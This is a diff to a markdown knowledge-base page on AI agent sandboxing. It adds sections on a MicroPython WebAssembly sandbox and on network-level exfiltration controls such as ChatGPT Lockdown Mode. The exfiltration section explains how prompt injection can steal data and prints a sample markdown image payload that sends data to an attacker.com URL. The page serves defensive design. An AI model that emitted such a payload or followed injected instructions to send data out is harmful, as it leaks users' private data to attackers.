@@ -2,7 +2,7 @@
 title: "Agent Sandboxing: Isolation Technologies for AI Agent Code Execution"
 description: "Agent Sandboxing is a spectrum of isolation technologies for secure AI agent dynamic code execution. It covers isolation technologies such as gVisor, Firecracker microVM, and WASM. Standard containers are insufficient due to shared kernels."
 created: 2026-04-20
-updated: 2026-06-05
+updated: 2026-06-06
 type: concept
 status: complete
 depth_tracking:
@@ -16,6 +16,8 @@ sources:
   - raw/articles/agent-sandboxing-2026-northflank.md
   - raw/articles/simonwillison.net--2026-may-30-how-we-contain-claude--6b2ad650.md
   - raw/articles/2026-03-22_kmad_ai-data-scientist-rlm-dataframe.md
+  - raw/articles/simonwillison.net--2026-micropython-wasm-sandbox.md
+  - raw/articles/openai-chatgpt-lockdown-mode-exfiltration-2026.md
 related:
  - agentic-engineering
  - ai-agent-engineering
@@ -86,6 +88,45 @@ AI agents are fundamentally different from traditional applications:
 **Key distinction from infrastructure sandboxes:** WASM sandboxing isolates at the *language runtime* level rather than the OS/hypervisor level. It's lighter weight (no VM startup) but provides a narrower security boundary — suitable for code-generation REPL loops where the primary risk is uncontrolled I/O, not kernel exploits.
 
 > See [[concepts/dspy-rlm]] for the full RLM architecture and [[concepts/sandbox/in-process]] for the in-process sandbox pattern.
+
+### MicroPython WASM Sandbox (Simon Willison, 2026)
+
+| Dimension | Assessment |
+|------|------|
+| **Isolation** | Language-level (WebAssembly sandbox via MicroPython) |
+| **Runtime** | MicroPython compiled to WASM (362KB blob) |
+| **Execution** | `wasmtime` Python library |
+| **Kernel** | No direct kernel access |
+| **Startup** | Sub-second |
+| **Overhead** | Very low (lighter than Pyodide) |
+| **Use Case** | Datasette Agent plugin system, lightweight LLM tool execution |
+
+**How it works:** Simon Willison's approach uses **MicroPython compiled to WebAssembly** as a lightweight sandbox for agent-executed code. It runs via the `wasmtime` Python library, supporting **memory limits**, **CPU limits** (fuel-based execution metering), **host functions** for controlled I/O, and **persistent sessions**. The entire WASM blob is only 362KB — significantly smaller than Pyodide-based approaches.
+
+**Key differences from Deno + Pyodide:** While the DSPy RLM approach uses Deno + Pyodide (full CPython compiled to WASM), this approach uses MicroPython — a much smaller Python implementation. The trade-off is: fewer Python standard library modules available, but dramatically faster startup and lower memory footprint. The `wasmtime` fuel mechanism provides deterministic CPU bound guarantees that Deno's V8 isolate does not.
+
+**Used in practice:** The Datasette Agent plugin system uses this sandbox to safely execute LLM-generated plugin code, with host functions mediating all file and database access. Persistent sessions allow stateful multi-step tool execution within the sandbox boundary.
+
+> Both WASM sandbox approaches share the principle of language-level isolation without kernel access, but serve different scales: Deno+Pyodide for full-featured Python data science workflows, MicroPython for lightweight plugin execution with minimal overhead.
+
+### Network-Level Exfiltration Controls
+
+While code-level sandboxes (WASM, gVisor, Firecracker) isolate *what code can do*, a complementary defense layer controls *where data can go*. Network-level exfiltration controls are not code sandboxes — they are **deterministic, product-level network restrictions** that prevent data from leaving the environment even if prompt injection succeeds in manipulating the agent.
+
+#### OpenAI ChatGPT Lockdown Mode (2026)
+
+OpenAI introduced **Lockdown Mode** in ChatGPT as a product-level defense against prompt injection data exfiltration. Key characteristics:
+
+- **Not a code sandbox** — it operates at the network layer, restricting outbound HTTP requests
+- **Deterministic enforcement** — not AI-evaluated; hard-coded network rules block exfiltration paths
+- **Targets the "Lethal Trifecta"** — Simon Willison's model where the three legs are (1) access to private data, (2) exposure to untrusted input, and (3) ability to exfiltrate data. Lockdown Mode cuts off leg (3) by blocking outbound network access to attacker-controlled endpoints
+- **Complementary to code sandboxes** — even if the agent code runs in a WASM or container sandbox, network-level controls provide defense-in-depth against exfiltration via allowed network channels (e.g., tool calls, API requests, markdown image loading)
+
+**Why this matters for agent sandboxing:** Code sandboxes control what the agent *can execute*. Network exfiltration controls control what the agent *can send out*. A sophisticated prompt injection attack might bypass code-level restrictions by using legitimate tool capabilities (e.g., loading a markdown image with `![data](https://attacker.com/exfil?data=...)`). Network-level controls block these channels deterministically.
+
+**Design principle:** "If data can never leave the network boundary, prompt injection becomes a local-only attack — the attacker can manipulate the agent's behavior but cannot extract the stolen data."
+
+> This represents a different *layer* in the defense-in-depth model: code sandboxing (what runs) + network controls (what leaves) + permission scoping (what's accessible). See the [[#Isolation Technology Spectrum]] for code-level approaches.
 
 ### Kata Containers (VM Partitioning via VMM)
 | Dimension | Assessment |
